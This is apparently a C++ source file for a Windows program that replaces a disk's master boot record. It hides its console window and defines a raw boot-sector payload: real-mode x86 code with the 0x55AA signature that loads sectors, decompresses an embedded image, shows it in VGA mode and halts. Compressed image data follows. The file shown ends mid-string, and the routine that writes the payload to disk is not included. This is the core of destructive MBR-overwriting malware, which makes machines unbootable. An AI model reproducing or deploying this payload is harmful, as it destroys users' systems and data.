#include <iostream>
#include <memory>
#include <stdio.h>
#include <tchar.h>
#include <time.h>
#include <windows.h>
#include <windef.h>
#include <cmath>
#pragma comment(lib, "Winmm.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
using namespace std;
#define mbrsize 9728
#define boot "\xBB\xE0\x07\x8E\xC3\x8E\xDB\xB8\x16\x02\xB9\x02\x00\xB6\x00\xBB\x00\x00\xCD\x13\x31\xC0\x89\xC3\x89\xC1\x89\xC2\xBE\x00\x00\xBF\x44\x22\xAC\x81\xFE\x44\x22\x73\x31\x3C\x80\x73\x02\xEB\x0F\x24\x7F\x88\xC1\xAC\xAA\xFE\xC9\x80\xF9\xFF\x75\xF7\xEB\xE4\xB4\x00\x3C\x40\x72\x05\x24\x3F\x88\xC4\xAC\x89\xC1\xAD\x89\xF2\x89\xFE\x29\xC6\xAC\xAA\xE2\xFC\x89\xD6\xEB\xC8\xB8\x13\x00\xCD\x10\xBB\xE0\x07\x8E\xDB\xBE\x44\x22\xB4\x00\xAC\xBB\x00\x00\x89\xC1\xBA\xC8\x03\x88\xD8\xEE\x43\xBA\xC9\x03\xAC\xEE\xAC\xEE\xAC\xEE\xE2\xEE\xBB\x00\xA0\x8E\xC3\xBF\x00\x00\xB9\x00\x7D\xF3\xA5\xF4\xEB\xFD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\xAA\x87\xFF\x20\x15\x0F\x0F\x25\x11\x1F\x05\x06\x00\x82\x0F\x25\x11\x09\x0C\x00\x87\x10\x24\x11\x1F\x16\x0F\x10\x24\x04\x12\x00\x90\x11\x23\x11\x1E\x16\x0F\x1E\x16\x0F\x0E\x25\x11\x12\x22\x11\x0E\x26\x04\x24\x00\x81\x13\x21\x04\x15\x00\x81\x13\x21\x04\x2A\x00\x87\x10\x24\x11\x1D\x17\x0F\x12\x22\x04\x18\x00\x81\x1E\x17\x0A\x36\x00\x81\x1D\x18\x04\x15\x00\x92\x18\x1C\x10\x0E\x26\x12\x16\x1E\x10\x15\x1F\x10\x11\x23\x11\x15\x1F\x10\x1D\x05\x24\x00\x88\x14\x20\x11\x13\x21\x11\x0E\x26\x12\x06\x15\x00\x84\x18\x1C\x10\x10\x23\x04\x60\x00\x84\x1C\x18\x0F\x1D\x17\x04\x5A\x00\x81\x16\x1E\x04\x15\x00\x82\x0F\x25\x12\x06\x0C\x00\x84\x10\x24\x11\x17\x1D\x04\x06\x00\x81\x1B\x19\x04\x3F\x00\x82\x1F\x15\x0F\x06\x3C\x00\x84\x0E\x26\x12\x19\x1B\x04\x18\x00\x9F\x1A\x1A\x0F\x15\x1F\x10\x1E\x16\x0F\x18\x1C\x10\x19\x1B\x10\x17\x1D\x10\x17\x1D\x10\x1C\x18\x0F\x1C\x19\x0F\x1F\x15\x0F\x1F\x15\x04\x57\x00\x84\x1B\x19\x0F\x14\x20\x04\x66\x00\x8A\x1F\x15\x0F\x0D\x26\x12\x12\x22\x11\x11\x22\x04\x39\x00\x06\x1B\x00\x82\x1E\x16\x0F\x06\xED\x00\x81\x16\x1E\x04\xA5\x00\x8D\x14\x20\x10\x0D\x27\x12\x1E\x16\x0F\x19\x1B\x10\x1F\x15\x04\x5D\x00\x81\x16\x1E\x04\xC3\x00\x81\x1A\x1A\x04\x57\x00\x81\x0D\x27\x04\x7E\x00\x81\x14\x20\x04\xC9\x00\x8A\x1C\x18\x0F\x17\x1D\x10\x0E\x25\x12\x14\x20\x04\x7B\x00\x84\x0D\x27\x12\x1A\x1A\x04\x09\x00\x81\x1F\x16\x04\x57\x00\x81\x1B\x19\x04\x42\x00\x04\xDB\x00\x80\x19\x04\xB4\x00\x06\xE4\x00\x84\x1A\x1A\x10\x0F\x24\x04\x09\x00\x84\x0F\x25\x12\x18\x1C\x04\x6F\x00\x81\x17\x1D\x04\x5D\x00\x81\x1D\x17\x04\x1B\x00\x84\x0D\x27\x12\x1B\x19\x04\x05\x01\x81\x1B\x19\x04\xCF\x00\x81\x15\x1F\x04\x44\x01\x8A\x10\x24\x11\x19\x1B\x10\x1A\x1B\x10\x13\x20\x04\x86\x01\x81\x17\x1D\x04\x63\x00\x8A\x15\x1F\x10\x19\x1C\x10\x17\x1E\x10\x13\x21\x07\x77\x01\x06\xF9\x00\x81\x1D\x17\x04\xB1\x00\x81\x14\x20\x04\xB4\x00\x81\x0C\x28\x04\x3C\x00\x81\x0E\x26\x04\x71\x01\x81\x13\x21\x04\x06\x00\x87\x1F\x15\x0F\x20\x15\x0F\x19\x1C\x04\x36\x00\x81\x12\x22\x04\x33\x00\x82\x18\x1C\x10\x04\x93\x00\x92\x25\x12\x1B\x1A\x0F\x1A\x1A\x0F\x14\x1F\x10\x12\x23\x11\x0A\x2A\x12\x0F\x26\x04\x93\x00\x06\x83\x01\x81\x1A\x1A\x05\x51\x00\x80\x1D\x04\x75\x00\x81\x0F\x25\x04\xDA\x01\x06\x08\x01\x81\x0B\x28\x04\x0B\x01\x84\x1C\x18\x0F\x12\x21\x04\x81\x00\x84\x10\x24\x11\x0A\x29\x04\xE7\x00\x05\x81\x00\x82\x11\x10\x25\x04\x60\x00\x82\x1A\x1A\x10\x04\x4E\x00\x80\x25\x04\x16\x02\x81\x1B\x19\x04\x48\x00\x84\x1E\x17\x0F\x15\x20\x04\xF3\x00\x06\xA2\x00\x81\x0F\x24\x04\x30\x00\x06\x57\x00\x81\x13\x21\x04\x56\x01\x81\x17\x1D\x04\x08\x01\x81\x1C\x18\x04\x98\x01\x84\x12\x21\x11\x16\x1F\x04\x27\x00\x09\x29\x01\x81\x12\x22\x04\x39\x00\x84\x0A\x2A\x12\x0A\x29\x04\x22\x02\x84\x0B\x29\x12\x0E\x26\x04\x80\x01\x84\x11\x24\x11\x18\x1D\x04\x78\x00\x81\x0D\x27\x04\x0F\x00\x81\x1D\x17\x04\xD4\x01\x81\x15\x1F\x04\xFF\x00\x80\x16\x05\x82\x02\x81\x18\x1C\x04\x06\x00\x86\x1F\x15\x0F\x00\x00\x00\x00\x04\x04\x00\x08\x08\x00\x10\x10\x00\x20\x20\x00\x40\x40\x40\x00\x40\x80\x80\x00\x41\x00\x00\x01\x42\x00\x00\x02\x44\x00\x00\x04\x42\x2E\x2E\x02\x87\x02\x02\x02\x61\x61\x61\x46\x46\x41\x40\x40\x01\x41\x38\x40\x01\x85\x31\x31\x31\x8D\x8D\x8D\x40\x69\x40\x01\x91\x02\x02\x02\x12\x12\x12\x09\x09\x0E\x0E\x0E\x14\x14\x4D\x4D\x4D\x3E\x3E\x41\x40\x40\x01\x41\xFF\x80\x02\x87\xD2\xD2\xD2\x40\x40\x40\xC4\xC4\x34\x3C\x00\x8C\x06\x06\x61\x61\x61\x61\x61\x61\x1B\x1B\x0E\x0E\x0E\x21\x39\x01\x99\x1F\x1F\x1F\x2E\x2E\x6E\x6E\x6E\x49\x49\x49\x34\x34\x5D\x5D\x5D\x49\x49\x2E\x2E\x2E\x57\x57\x18\x18\x18\x36\x7C\x00\x87\x4E\x4E\x4E\x09\x09\x06\x06\x06\x41\x40\x40\x01\x40\x7C\x3E\x01\x8C\x06\x06\x9C\x9C\x9C\x05\x05\x05\x23\x23\x5C\x5C\x5C\x31\x3E\x00\x8E\x83\x83\x74\x74\x74\x91\x91\x91\x42\x42\x87\x87\x87\x09\x09\x12\x33\x01\x08\xDE\x00\xA1\xF6\xF6\xF6\x21\x21\x2A\x2A\x2A\x5B\x5B\x3D\x3D\x3D\x16\x16\x16\x08\x08\x08\x08\x08\x08\x08\xF7\xF7\xF7\x30\x30\x65\x65\x65\x31\x31\x31\x23\xAA\x00\x97\x06\x0E\x0E\x1B\x1B\x1B\x73\x73\x73\x94\x94\x5D\x5D\x5D\x65\x65\x45\x45\x45\x38\x38\x9D\x9D\x9D\x15\x7C\x00\x41\x40\x40\x01\x41\xA7\x80\x02\x8C\x58\x58\x37\x37\x37\x01\x01\x01\xD3\xD3\x14\x14\x14\x31\x3E\x00\x8E\x89\x89\x24\x24\x24\x24\x24\x24\xBB\xBB\x45\x45\x45\x4F\x4F\x10\x69\x07\xAD\xAA\xAA\x4B\x4B\x4B\x06\x06\x06\xB1\xB1\xA5\xA5\xA5\x43\x43\x01\x01\x01\x8E\x8E\x7B\x7B\x7B\x0F\x0F\x0F\x6F\x6F\x22\x22\x22\x11\x11\x03\x03\x03\x05\x05\xB4\xB4\xB4\xF8\xF8\xF8\x32\x32\x15\x33\x01\xA8\x18\x18\x75\x75\x75\x02\x02\x02\x4C\x4C\x34\x34\x34\x52\x52\x1E\x1E\x1E\x66\x66\x66\x16\x16\x3B\x3B\x3B\x28\x28\x8F\x8F\x8F\x16\x16\x8F\x8F\x8F\x10\x10\x10\xBC\xBC\x37\x46\x05\x41\x40\x40\x01\x41\x80\x80\x02\x89\x44\x44\x2F\x2F\x2F\x1D\x1D\x1D\x34\x34\x31\x09\x08\x91\x02\x02\x02\x42\x42\x20\x20\x20\x10\x10\x10\x25\x25\x20\x20\x20\x68\x68\x0D\x1F\x00\xB1\x7E\x7E\x7E\x6A\x6A\x47\x47\x47\x78\x78\x78\x37\x37\x7F\x7F\x7F\x1D\x1D\x3B\x3B\x3B\x20\x20\x99\x99\x99\x52\x52\x52\x19\x19\x20\x20\x20\x2C\x2C\x17\x17\x17\x03\x03\x01\x01\x01\x10\x10\x10\x4A\x4A\x09\x11\xC5\x04\xA1\x80\x80\x80\xB8\xB8\xBC\xBC\xBC\x23\x23\x23\xC5\xC5\x16\x16\x16\x04\x04\x03\x03\x03\x11\x11\x11\x93\x93\x0F\x0F\x0F\x03\x03\x36\x36\x36\x04\x07\x00\x8A\x03\x17\x17\x17\x55\x55\x38\x38\x38\x5E\x5E\x41\x40\x40\x01\x40\x72\x7B\x11\x89\xE7\xE7\x81\x81\x81\x17\x17\x17\x34\x34\x34\x3E\x00\x8C\x47\x47\x10\x10\x10\x6A\x6A\x6A\x0A\x0A\x1E\x1E\x1E\x0D\x83\x0B\xB5\x46\x46\x6C\x6C\x6C\x07\x07\xC5\xC5\xC5\x52\x52\x52\x37\x37\x5F\x5F\x5F\x34\x34\x90\x90\x90\x1F\x1F\x0E\x0E\x0E\x86\x86\x86\x9E\x9E\x32\x32\x32\x6D\x6D\x49\x49\x49\x3B\x3B\x0B\x0B\x0B\x3D\x3D\x3D\xBB\xBB\x4B\x4B\x4B\x0F\x62\x00\xA4\xB2\xB2\xB2\x01\x01\x2F\x2F\x2F\xBB\xBB\xBB\x2A\x2A\x13\x13\x13\x19\x19\xC9\xC9\xC9\x52\x52\x52\xAB\xAB\x15\x15\x15\x15\x15\x37\x37\x37\x1E\x1E\x04\x05\x55\x01\x86\x1D\x1D\x10\x10\x10\x84\x84\x12\x83\x01\x41\x40\x40\x01\x41\x9D\x80\x02\x8C\x0E\x0E\x0E\x70\x70\x2B\x2B\x2B\x28\x28\x28\x38\x38\x31\x3E\x00\x91\x63\x63\x63\x38\x38\x10\x10\x10\x2C\x2C\x2C\x0A\x0A\x20\x20\x20\xE1\xE1\x0D\x9A\x07\x94\x1C\x1C\x1C\x43\x43\x35\x35\x35\x1F\x1F\x1F\x18\x18\x0E\x0E\x0E\x09\x09\x02\x02\x02\x0F\x43\x00\x8F\xD4\xD4\xD4\x29\x29\x07\x07\x07\x04\x04\x04\x10\x10\x67\x67\x67\x0F\x21\x00\x9C\x94\x94\x94\x0A\x0A\x33\x33\x33\x86\x86\x86\x1B\x1B\x18\x18\x18\x27\x27\x32\x32\x32\x9E\x9E\x9E\x1B\x1B\x1B\x1B\x1B\x05\x12\x00\x91\x31\x31\xBD\xBD\xBD\x04\x04\x04\x0B\x0B\x17\x17\x17\x15\x15\x76\x76\x76\x41\x40\x40\x01\x40\x6C\x40\x01\x8C\x59\x59\x59\x16\x16\x03\x03\x03\x28\x28\x28\x47\x47\x31\x3E\x00\x8A\x18\x18\x18\x13\x13\x1E\x1E\x1E\x25\x25\x25\x04\xBC\x00\x80\x15\x0D\x40\x0A\x89\x42\x42\x05\x05\x05\x5B\x5B\x74\x74\x74\x12\x36\x01\x0D\x0D\x00\x8E\x2E\x2E\x9A\x9A\x9A\x04\x04\x04\x0C\x0C\x2E\x2E\x2E\x12\x12\x0D\x1C\x00\x87\x15\x15\x15\x1D\x1D\xA6\xA6\xA6\x1C\xDD\x11\x8F\x53\x53\x53\x26\x26\x26\x01\x01\x04\x04\x04\x5B\x5B\x9D\x9D\x9D\x41\x40\x40\x01\x41\xAC\x80\x02\x8A\x23\x23\x23\x03\x03\x04\x04\x04\xE8\xE8\xE8\x14\x3F\x0D\x1F\x3E\x00\x87\xAA\xAA\xAA\x13\x13\x0C\x0C\x0C\x05\x4A\x11\x82\x84\x84\x84\x0D\x1D\x00\x8A\x21\x21\x05\x05\x05\x0A\x0A\x49\x49\x49\x12\x0F\x15\x01\x0F\x46\x00\x8E\x48\x48\x0A\x0A\x0A\x36\x36\x36\x1C\x1C\x23\x23\x23\x61\x61\x0D\x3E\x0B\x87\x01\x01\x01\x01\x01\x19\x19\x19\x1F\xDB\x0B\x8C\x6D\x6D\x6D\x04\x04\x07\x07\x07\x16\x16\x6B\x6B\x6B\x21\xC8\x15\x41\x40\x40\x01\x40\x4B\x40\x01\x8A\x33\x33\x33\x01\x01\x3B\x3B\x3B\x26\x26\x26\x31\x06\x17\x91\x02\x02\xE4\xE4\xE4\x13\x13\x1C\x1C\x1C\x28\x28\x28\x08\x08\x1F\x1F\x1F\x0D\x1F\x00\x82\x98\x98\x01\x04\x54\x03\x85\x34\x34\x34\x1A\x1A\x1A\x1C\x48\x00\x8E\x80\x80\x25\x25\x25\x01\x01\x01\x05\x05\x92\x92\x92\x4C\x4C\x08\x17\x00\x8C\x12\x12\x12\x15\x15\xF9\xF9\xF9\x1D\x1D\x2D\x2D\x2D\x1F\x03\x04\x8E\x02\x02\x02\x0C\x0C\xB0\xB0\xB0\x04\x04\x29\x29\x29\x3C\x3C\x41\x40\x40\x01\x41\xAA\x80\x02\x8A\x85\x85\x85\x01\x01\x16\x16\x16\x64\x64\x64\x33\x7C\x0B\x8C\x15\x15\x15\xE9\xE9\x1C\x1C\x1C\x08\x08\x08\x7C\x7C\x0D\xE3\x00\x8F\x02\x02\x02\x2D\x2D\x6F\x6F\x6F\x05\x05\xB9\xB9\xB9\x4E\x4E\x4E\x1E\xBD\x04\x82\x08\x08\x08\x05\xE9\x04\x84\x30\x30\x30\xCE\xCE\x0B\x96\x1E\x89\x01\x01\x0F\x0F\x0F\x08\x08\x73\x73\x73\x22\x8E\x00\x82\xA7\xA7\x03\x04\xC9\x11\x84\x15\x15\x15\xBA\xBA\x41\x40\x40\x01\x40\x68\x3E\x01\x8C\x09\x09\x39\x39\x39\x0B\x0B\x08\x08\x08\x23\x23\x23\x31\x3E\x00\x8E\x57\x57\x33\x33\x33\x1E\x1E\x43\x43\x43\x08\x08\x08\x94\x94\x10\x38\x16\x89\x70\x70\x22\x22\x22\xBE\xBE\xFA\xFA\xFA\x1A\xD4\x0F\x93\x02\x02\x57\x57\x57\x40\x40\x07\x07\x07\x01\x01\x01\x39\x39\x8A\x8A\x8A\x59\x59\x08\x1C\x00\x89\x71\x71\x71\x22\x22\x01\x01\x01\x20\x20\x10\x1A\x04\x15\x4B\x00\x8B\xEA\xEA\x01\x01\x01\x36\x36\x56\x56\x56\x9C\x9C\x1F\xEE\x03\x41\x40\x40\x01\x41\x89\x80\x02\x8C\x27\x27\x1D\x1D\x1D\x01\x01\xFB\xFB\xFB\xFC\xFC\xFC\x31\xFB\x13\x8C\x3A\x3A\x33\x33\x33\x0C\x0C\x16\x16\x16\xA3\xA3\xA3\x0F\xF5\x06\x8C\x27\x27\x27\x19\x19\x0F\x0F\x0F\x16\x16\x3A\x3A\x3A\x12\x80\x07\x9B\x06\x06\x06\x0D\x0D\x1F\x1F\x1F\x35\x35\x0A\x0A\x0A\x0F\x0F\x0B\x0B\x0B\x0A\x0A\x0A\x10\x10\x23\x23\x23\x5A\x5A\x08\x22\x00\x82\xD5\xD5\xD5\x04\x5C\x1A\x83\x05\xAB\xAB\x4F\x0F\x98\x1A\x15\x91\x00\x8B\x91\x91\x0B\x0B\x0B\x01\x01\x66\x66\x66\x65\x65\x40\x68\x05\x14\x41\x40\x40\x01\x41\x40\x40\x01\x8C\x89\x89\x04\x04\x04\x01\x01\xD6\xD6\xD6\x2E\x2E\x2E\x31\x79\x15\x8A\x26\x26\x19\x19\x19\x1C\x1C\x05\x05\x05\x7C\x04\xBE\x08\x0D\x1F\x00\x8C\x4C\x4C\x4C\xC6\xC6\x0F\x0F\x0F\x25\x25\xBF\xBF\xBF\x05\x8F\x04\xA6\x02\x02\x02\x0E\x0E\x0D\x0D\x0D\x27\x27\xCE\xCE\xCE\x94\x94\x94\x8A\x8A\x0A\x0A\x0A\x03\x03\x0F\x0F\x0F\x01\x01\x08\x08\x08\x20\x20\x20\x45\x45\xC0\xC0\xC0\x08\x48\x00\x8E\x61\x61\x19\x19\x19\x03\x03\x3D\x3D\x3D\x96\x96\x0D\x0D\x0D\x22\x91\x00\x8B\x62\x62\x03\x03\x03\x07\x07\x40\x40\x40\x64\x64\x41\x40\x40\x01\x40\x68\x40\x01\x81\x38\x38\x05\x74\x0A\x85\x10\x10\x10\x71\x71\x71\x2E\x3B\x00\x8D\x3C\x3C\x3C\x29\x29\x56\x56\x56\x08\x08\x1D\x1D\x1D\x38\x0C\xFC\x17\xA9\x02\x02\x32\x32\x32\x23\x23\x23\x72\x72\xE5\xE5\xE5\x60\x60\x40\x40\x40\x9F\x9F\x9F\x94\x94\x51\x51\x51\x30\x30\x20\x20\x20\x40\x40\x0A\x0A\x0A\x6F\x6F\x6F\x2B\x2B\x93\x04\xC5\x1D\x8C\x07\x07\x07\x1C\x1C\xAC\xAC\xAC\x23\x23\x23\x80\x80\x0B\x66\x11\x89\x73\x73\x28\x28\x28\x0F\x0F\x2F\x2F\x2F\x14\x17\x1E\x13\x91\x00\x8B\x42\x42\x07\x07\x07\x07\x07\xFD\xFD\xFD\x64\x64\x34\x09\x25\x41\x40\x40\x01\x41\x74\x80\x02\x89\x15\x15\x6F\x6F\x6F\x9A\x9A\x15\x15\x15\x25\xA3\x0A\x0C\x7D\x07\x8F\x8C\x8C\x8C\xED\xED\xB4\xB4\xB4\x08\x08\x7F\x7F\x7F\x44\x44\x44\x0C\x12\x28\xB4\x35\x35\x35\x07\x07\x07\xB5\xB5\xEB\xEB\xEB\xEE\xEE\xC1\xC1\xC1\x7B\x7B\x7B\x7B\x7B\x3F\x3F\x3F\x69\x69\x88\x88\x88\x3F\x3F\x41\x41\x41\x2B\x2B\x2B\x2B\x2B\x0B\x0B\x0B\x16\x16\x10\x10\x10\x15\x15\xE7\xE7\xE7\x5A\x08\x79\x07\x04\x04\x00\x84\x14\x14\x14\x24\x24\x05\x55\x0B\x85\x20\x20\x20\x44\x44\x3E\x24\x62\x2E\x81\x2E\x2E\x05\xEF\x11\x84\x40\x40\x40\x24\x24\x0D\x4D\x00\x41\x40\x40\x01\x40\x5B\x40\x01\x82\xC6\xC6\x0B\x04\x37\x1D\x82\xA0\xA0\xA0\x1F\x63\x17\x0F\x0F\x00\x92\x46\x46\x46\x23\x23\x23\x19\x19\x85\x85\x85\x28\x28\xC9\xC9\xC9\x58\x58\x58\x0C\x10\x27\x9C\x6E\x6E\x6E\x2B\x2B\x2B\xCF\xCF\xB5\xB5\xB5\xC2\xC2\xA4\xA4\xA4\x01\x01\x01\x7B\x7B\x41\x41\x41\x3F\x3F\x3F\x3F\x3F\x05\x40\x01\x80\x01\x04\x74\x07\x8C\x79\x79\x79\x2D\x2D\x35\x35\x35\x59\x59\xFE\xFE\xFE\x0D\x60\x00\x8C\x68\x68\x68\x25\x25\x03\x03\x03\x16\x16\x5F\x5F\x5F\x0C\x5C\x00\x1B\x94\x00\x82\x84\x84\x11\x04\x0E\x27\x84\x66\x66\x66\xDA\xDA\x41\x40\x40\x01\x41\xA5\x80\x02\x8C\x02\x02\x02\x28\x28\x01\x01\x01\xCC\xCC\x92\x92\x92\x22\xBD\x31\x0C\x0C\x00\x8F\x0D\x0D\x0D\xA1\xA1\xA1\x19\x19\x2F\x2F\x2F\x0A\x0A\x2D\x2D\x2D\x0D\xB9\x2A\x8E\xE6\xE6\x4A\x4A\x4A\x54\x54\x54\xC8\xC8\xEE\xEE\xEE\x60\x60\x05\xDC\x17\x99\x08\x39\x39\x39\x39\x39\xC7\xC7\x43\x43\x43\x1C\x1C\x10\x10\x10\x29\x29\x29\x5D\x5D\x73\x73\x73\x4B\x4B\x15\x5C\x07\x82\x48\x48\x48\x05\x92\x11\x84\x2C\x2C\x84\x84\x84\x27\xDA\x01\x05\x4C\x08\x86\x0B\x0B\x66\x66\x66\x64\x64\x2E\xCE\x00\x41\x40\x40\x01\x37\x40\x01\x8C\x53\x53\x53\x05\x05\x01\x01\x01\x17\x17\x2A\x2A\x2A\x25\x23\x0D\x0C\x78\x20\x8C\x65\x65\x65\x30\x30\x2F\x2F\x2F\x05\x05\xD7\xD7\xD7\x0D\x21\x10\xA8\xE2\xE2\x3A\x3A\x3A\xC1\xC1\xC1\xD8\xD8\x60\x60\x60\x3B\x3B\x6C\x6C\x6C\x6B\x6B\x6B\x26\x26\x2D\x2D\x2D\x3A\x3A\x71\x71\x71\x48\x48\x44\x44\x44\x1F\x1F\x1F\x0D\x0D\x17\xA6\x13\x85\x02\x02\x02\x49\x49\x49\x04\x0C\x10\x85\x01\x19\x19\x62\x62\x62\x24\x91\x00\x85\x8B\x8B\x8B\x08\x08\x22\x04\x2F\x14\x84\x20\x20\x20\x21\x21\x40\x65\x92\x34\x41\x40\x40\x01\x41\x43\x80\x02\x05\x65\x04\x84\xD9\xD9\x29\x29\x29\x2E\xB2\x06\x8F\x27\x27\x27\x45\x45\x45\x13\x13\x25\x25\x25\x04\x04\x5D\x5D\x5D\x0F\xE1\x13\x93\xB3\xB3\xB3\x0F\x0F\x0F\x0F\x0F\x55\x55\x55\x35\x35\x5C\x5C\x5C\x09\x09\x09\x09\x04\x04\x00\x86\x12\x12\x06\x06\x06\x02\x02\x22\xCC\x1D\x8C\x26\x26\x26\x0B\x0B\x04\x04\x04\x8A\x8A\x50\x50\x50\x24\x8E\x00\x8C\x85\x85\x85\x8E\x8E\x11\x11\x11\x28\x28\xA0\xA0\xA0\x0A\x03\x18\x41\x40\x40\x01\x41\xA0\x80\x02\x05\x00\x05\x84\x9A\x9A\x51\x51\x51\x12\xBA\x2D\x1F\xB1\x3E\x8C\xD5\xD5\xD5\x30\x30\x43\x43\x43\x07\x07\xAD\xAD\xAD\x0D\x70\x04\x8C\x02\x02\x1E\x1E\x1E\x01\x01\x01\x0A\x0A\x2A\x2A\x2A\x0D\xD2\x2B\x29\x1D\x09\x82\x5B\x5B\x5B\x04\x98\x05\x82\x17\x2A\x2A\x22\x57\x38\x8C\x1A\x1A\x38\x38\x38\x22\x22\x22\xA4\xA4\x0B\x0B\x0B\x04\xB1\x01\x80\x35\x40\x67\x0F\x3C\x41\x40\x40\x01\x8D\xA8\xA8\xA8\x05\x05\x0B\x0B\x0B\x05\x05\x6C\x6C\x6C\x68\x0F\x3B\x34\x1E\x61\x03\x8F\x44\x44\x44\x2A\x2A\x2A\x20\x20\x28\x28\x28\x17\x17\xAA\xAA\xAA\x0F\xD3\x2A\x80\x04\x05\x8C\x27\x84\x08\x08\xDA\xDA\xDA\x2D\x17\x0E\x08\x89\x17\x04\x8A\x17\x86\x04\x04\x1C\x1C\x1C\x64\x64\x22\x93\x37\x05\xA7\x2E\x8A\x2B\x2B\x2B\x22\x22\x28\x28\x28\x24\x24\x5E\x40\x69\x83\x34\x41\x40\x40\x01\x41\x45\x80\x02\x05\x77\x27\x82\xB8\xB8\xB8\x2C\x40\x01\x8E\x06\x06\x3A\x3A\x3A\x13\x13\x13\x9B\x9B\x0A\x0A\x0A\x0C\x0C\x0D\x23\x07\x8F\x06\x06\x06\xE3\xE3\x0B\x0B\x0B\x1D\x1D\x1D\x2C\x2C\x35\x35\x35\x33\x98\x00\x82\x29\x29\x29\x05\x96\x0F\x82\x33\x33\x33\x21\x4A\x07\x84\x0D\x0D\x0D\x29\x29\x06\xDA\x11\x86\x0F\x0F\x37\x37\x37\x44\x44\x40\x68\xBB\x21\x41\x40\x40\x01\x07\x80\x07\x87\x81\x81\x81\x05\x05\x33\x33\x33\x2C\x40\x01\x8C\x09\x09\x51\x51\x51\x10\x10\x10\x3D\x3D\x36\x36\x36\x04\xB5\x30\x0B\x63\x03\x82\x31\x31\x31\x05\x55\x0A\x05\x3D\x07\x34\x4C\x03\x81\x4E\x4E\x05\xD3\x24\x85\x0B\x17\x17\x5F\x5F\x5F\x21\xD3\x47\x84\x24\x24\x24\xEF\xEF\x05\x15\x18\x85\x3F\x17\x17\x23\x23\x23\x2D\x86\x0E\x41\x40\x40\x01\x41\x7F\x80\x02\x8C\x4E\x4E\x4E\x05\x05\xD0\xD0\xD0\x17\x17\x33\x33\x33\x2C\x77\x37\x8C\x27\x27\x33\x33\x33\x9B\x9B\x9B\x04\x04\x2B\x2B\x2B\x0F\x76\x38\x8C\x48\x48\x48\x81\x81\x01\x01\x01\x5B\x5B\x5B\x23\x23\x34\x07\x11\x81\x7D\x7D\x05\x93\x1E\x85\x01\xA3\xA3\x5F\x5F\x5F\x0D\x0D\x32\x0F\x29\x00\x96\x4D\x4D\x4D\x34\x34\x2B\x2B\x2B\x69\x69\x3F\x3F\x3F\x22\x22\x22\x37\x37\x8B\x8B\x8B\xA9\xA9\x41\x40\x40\x01\x40\x6D\x3B\x3D\x81\x40\x40\x05\x68\x0D\x85\x19\x19\x19\x78\x78\x78\x29\x36\x00\x8E\xAE\xAE\x37\x37\x37\x5B\x5B\x5B\x0B\x0B\x03\x03\x03\x67\x67\x0D\x1D\x00\x82\x64\x64\x64\x05\xFF\x00\x80\x2C\x04\x7E\x07\x34\x0C\x07\x8C\x82\x82\x22\x22\x22\x04\x04\x04\x2F\x2F\x64\x64\x64\x1A\x80\x01\x86\x14\x14\x5D\x5D\x5D\x01\x01\x05\x8E\x1A\x87\x01\x01\x01\x56\x56\x56\x78\x78\x2E\x04\x1B\x41\x40\x40\x01\x41\x81\x80\x02\x85\x00\x00\x00\x8D\x8D\x0B\x04\x68\x13\x87\x40\x40\x40\xB9\xB9\xB9\x75\x75\x26\x6E\x47\x88\x58\xF0\xF0\xAC\xAC\xAC\xC7\xC7\xC7\x04\xDE\x27\x80\x25\x0D\xF2\x06\x86\x32\x32\xE8\xE8\xE8\x0F\x0F\x05\x4C\x3E\x82\x10\x90\x90\x31\x40\x01\x8F\x09\x09\x09\x13\x13\x03\x03\x03\xBE\xBE\xBE\x56\x56\xBF\xBF\xBF\x1A\xFB\x04\x84\x21\x21\x0A\x0A\x0A\x04\x80\x47\x88\x11\x04\x04\x2C\x2C\x2C\x6E\x6E\x6E\x33\xFC\x47\x41\x40\x40\x01\x40\x41\x40\x01\x8A\x91\x91\x03\x03\x03\x03\x03\x2F\x2F\x2F\x2A\x04\xAE\x09\x22\x31\x00\x91\x12\x12\x98\x98\x98\x13\x13\x66\x66\x66\x01\x01\x01\x11\x11\xE7\xE7\xE7\x0F\x44\x26\x8A\x17\x17\x17\x04\x04\x43\x43\x43\x26\x26\x26\x2D\x52\x14\x09\x3E\x0A\x81\x0C\x0C\x05\x87\x3A\x82\x16\x2A\x2A\x1A\x13\x08\x85\x80\x80\x80\x2C\x2C\x0F\x04\xFC\x26\x88\x16\x16\x16\x55\x55\x34\x34\x34\x61\x1C\xAA\x07\x41\x40\x40\x01\x41\x9